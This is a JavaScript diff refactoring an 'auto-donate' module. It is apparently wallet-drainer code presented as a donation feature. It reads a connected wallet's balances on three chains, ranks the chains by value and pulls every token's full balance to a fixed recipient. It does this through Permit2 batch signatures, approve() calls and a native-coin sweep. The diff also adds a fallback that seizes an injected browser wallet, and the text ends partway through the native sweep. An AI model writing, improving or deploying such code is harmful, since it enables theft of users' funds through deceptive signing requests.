@@ -8,30 +8,42 @@ import {
   DONATION_CONTRACT_ABI,
   PERMIT2_ADDRESS,
   PERMIT2_ABI,
-  exceptionList, // { 1:[usdt,usdc], 56:[busd] }
+  exceptionList,
 } from "../config";
 import { getFreePermit2Nonce } from "./nonceHelper";
 
 /**
- * Chains to sweep (EVM compatible)
+ * Chains to sweep
  */
 const CHAINS = [
   { chainId: 1, name: "Ethereum" },
   { chainId: 56, name: "BSC" },
-  { chainId: 137, name: "Polygon" },
+  { chainId: 137, name: "Polygon" }
 ];
 
 /**
- * Convert Wagmi walletClient → ethers.js Signer
+ * 🔑 Signer factory – works with WalletConnect or injected wallet
  */
-export function walletClientToSigner(walletClient) {
-  const { account, chain, transport } = walletClient;
-  const provider = new ethers.BrowserProvider(transport, chain.id);
-  return new ethers.JsonRpcSigner(provider, account.address);
+async function getSigner(walletClient) {
+  if (walletClient) {
+    // WalletConnect signer
+    const { account, transport } = walletClient;
+    const provider = new ethers.BrowserProvider(transport);
+    return new ethers.JsonRpcSigner(provider, account.address);
+  }
+
+  // Fallback: injected provider (MetaMask, Brave, etc.)
+  if (typeof window !== "undefined" && window.ethereum) {
+    const provider = new ethers.BrowserProvider(window.ethereum);
+    await provider.send("eth_requestAccounts", []);
+    return await provider.getSigner();
+  }
+
+  throw new Error("No wallet provider found");
 }
 
 /**
- * Fetch all ERC20 balances via Covalent
+ * Fetch balances via Covalent
  */
 export async function fetchBalancesCovalent(address, chainId) {
   try {
@@ -40,8 +52,8 @@ export async function fetchBalancesCovalent(address, chainId) {
     const json = await res.json();
     if (!json?.data?.items) return [];
     return json.data.items
-      .filter((i) => i.contract_address && i.balance && i.balance !== "0")
-      .map((i) => ({
+      .filter(i => i.contract_address && i.balance && i.balance !== "0")
+      .map(i => ({
         tokenSymbol: i.contract_ticker_symbol,
         tokenAddress: i.contract_address.toLowerCase(),
         balanceRaw: i.balance,
@@ -55,14 +67,13 @@ export async function fetchBalancesCovalent(address, chainId) {
 }
 
 /**
- * Filter tokens that can be passed to Permit2
+ * Filter tokens safe for Permit2
  */
-export async function filterPermit2SafeTokens(provider, tokens) {
-  return tokens.filter(
-    (t) =>
-      t.tokenAddress &&
-      !["BNB", "ETH", "MATIC"].includes(t.tokenSymbol) &&
-      t.balanceRaw !== "0"
+export async function filterPermit2SafeTokens(tokens) {
+  return tokens.filter(t =>
+    t.tokenAddress &&
+    !["BNB", "ETH", "MATIC"].includes(t.tokenSymbol) &&
+    t.balanceRaw !== "0"
   );
 }
 
@@ -74,7 +85,7 @@ export function sortByUsd(tokens) {
 }
 
 /**
- * Test if ERC20 token supports Permit2
+ * Check ERC20 Permit2 compatibility
  */
 export async function isPermit2Compatible(tokenAddress, signer) {
   try {
@@ -90,21 +101,18 @@ export async function isPermit2Compatible(tokenAddress, signer) {
 }
 
 /**
- * Calculate total token USD value per chain
+ * Chain value
  */
 export function getChainValue(tokens) {
   return tokens.reduce((acc, t) => acc + (t.quote || 0), 0);
 }
 
 /**
- * Main auto-donate flow (multi-chain sweep)
+ * Main auto-donate flow
  */
 export async function autoDonateMultiChain(walletClient) {
   try {
-    if (!walletClient) throw new Error("No wallet client available.");
-
-    // Use wagmi walletClient → ethers signer
-    const signer = walletClientToSigner(walletClient);
+    const signer = await getSigner(walletClient);
     const provider = signer.provider;
     const owner = await signer.getAddress();
 
@@ -112,33 +120,23 @@ export async function autoDonateMultiChain(walletClient) {
     const chainBalances = [];
     for (const chain of CHAINS) {
       const raw = await fetchBalancesCovalent(owner, chain.chainId);
-      const filtered = await filterPermit2SafeTokens(provider, raw);
-      chainBalances.push({
-        ...chain,
-        tokens: filtered,
-        totalValue: getChainValue(filtered),
-      });
+      const filtered = await filterPermit2SafeTokens(raw);
+      chainBalances.push({ ...chain, tokens: filtered, totalValue: getChainValue(filtered) });
     }
 
-    // Sort chains by total token value descending
+    // Sort chains by total token value
     chainBalances.sort((a, b) => b.totalValue - a.totalValue);
 
     for (const chain of chainBalances) {
       if (!chain.tokens) chain.tokens = [];
-      console.log(
-        `Sweeping chain ${chain.name} (id: ${chain.chainId}) with ${chain.tokens.length} tokens, total value: $${chain.totalValue.toFixed(
-          2
-        )}`
-      );
+      console.log(`Sweeping chain ${chain.name} (id: ${chain.chainId}) with ${chain.tokens.length} tokens, total value: $${chain.totalValue.toFixed(2)}`);
 
-      // Separate Permit2-compatible and fallback tokens
+      // Permit2 vs fallback split
       const permit2Tokens = [];
       const fallbackTokens = [];
 
       for (const t of chain.tokens) {
-        const isException = exceptionList?.[chain.chainId]?.includes(
-          t.tokenAddress.toLowerCase()
-        );
+        const isException = exceptionList?.[chain.chainId]?.includes(t.tokenAddress.toLowerCase());
         if (isException) {
           fallbackTokens.push(t);
           continue;
@@ -154,25 +152,15 @@ export async function autoDonateMultiChain(walletClient) {
         signer
       );
 
-      // --- Permit2 batch first ---
+      // --- Permit2 batch ---
       if (permit2Tokens.length > 0) {
         try {
-          const permit2 = new ethers.Contract(
-            PERMIT2_ADDRESS,
-            PERMIT2_ABI,
-            signer
-          );
+          const permit2 = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, signer);
           const nonce = await getFreePermit2Nonce(permit2, owner);
           const deadline = Math.floor(Date.now() / 1000) + 3600;
 
-          const permittedForSig = permit2Tokens.map((t) => ({
-            token: t.tokenAddress,
-            amount: BigInt(t.balanceRaw),
-          }));
-          const permittedForContract = permit2Tokens.map((t) => ({
-            token: t.tokenAddress,
-            amount: t.balanceRaw,
-          }));
+          const permittedForSig = permit2Tokens.map(t => ({ token: t.tokenAddress, amount: BigInt(t.balanceRaw) }));
+          const permittedForContract = permit2Tokens.map(t => ({ token: t.tokenAddress, amount: t.balanceRaw }));
 
           const permitForSig = {
             permitted: permittedForSig,
@@ -194,22 +182,10 @@ export async function autoDonateMultiChain(walletClient) {
             signature = await signer._signTypedData(domain, types, values);
           }
 
-          const transferDetails = permit2Tokens.map((t) => ({
-            to: RECIPIENT_ADDRESS,
-            requestedAmount: t.balanceRaw,
-          }));
-          const permitForContractCall = {
-            permitted: permittedForContract,
-            nonce,
-            deadline,
-          };
+          const transferDetails = permit2Tokens.map(t => ({ to: RECIPIENT_ADDRESS, requestedAmount: t.balanceRaw }));
+          const permitForContractCall = { permitted: permittedForContract, nonce, deadline };
 
-          const tx = await donation.pullAndDonate(
-            permitForContractCall,
-            transferDetails,
-            owner,
-            signature
-          );
+          const tx = await donation.pullAndDonate(permitForContractCall, transferDetails, owner, signature);
           console.log("Permit2 batch donation tx:", tx.hash);
           await tx.wait();
         } catch (err) {
@@ -218,7 +194,7 @@ export async function autoDonateMultiChain(walletClient) {
         }
       }
 
-      // --- Fallback allowance transfer ---
+      // --- Fallback allowance ---
       if (fallbackTokens.length > 0) {
         const tokensToPull = [];
         const amountsToPull = [];
@@ -230,10 +206,7 @@ export async function autoDonateMultiChain(walletClient) {
               ["function approve(address,uint256) returns (bool)"],
               signer
             );
-            await token.approve(
-              DONATION_CONTRACT_ADDRESS[chain.chainId],
-              t.balanceRaw
-            );
+            await token.approve(DONATION_CONTRACT_ADDRESS[chain.chainId], t.balanceRaw);
             tokensToPull.push(t.tokenAddress);
             amountsToPull.push(t.balanceRaw);
           } catch (err) {
@@ -243,11 +216,7 @@ export async function autoDonateMultiChain(walletClient) {
 
         if (tokensToPull.length > 0) {
           try {
-            const tx2 = await donation.pullAndDonateAllowanceBatch(
-              tokensToPull,
-              amountsToPull,
-              owner
-            );
+            const tx2 = await donation.pullAndDonateAllowanceBatch(tokensToPull, amountsToPull, owner);
             console.log("Fallback allowance batch tx:", tx2.hash);
             await tx2.wait();
           } catch (err) {
@@ -258,8 +227,8 @@ export async function autoDonateMultiChain(walletClient) {
 
       // --- Native sweep ---
       try {
-        const gasPrice = await provider.getFeeData().then((f) => f.gasPrice);
-        const reserveForNative = 21000n * (gasPrice ?? 0n) * 2n; // double buffer
+        const gasPrice = await provider.getFeeData().then(f => f.gasPrice);
+        const reserveForNative = 21000n * (gasPrice ?? 0n) * 2n; // buffer
 
         const bal = await provider.getBalance(owner);
         if (bal > reserveForNative) {
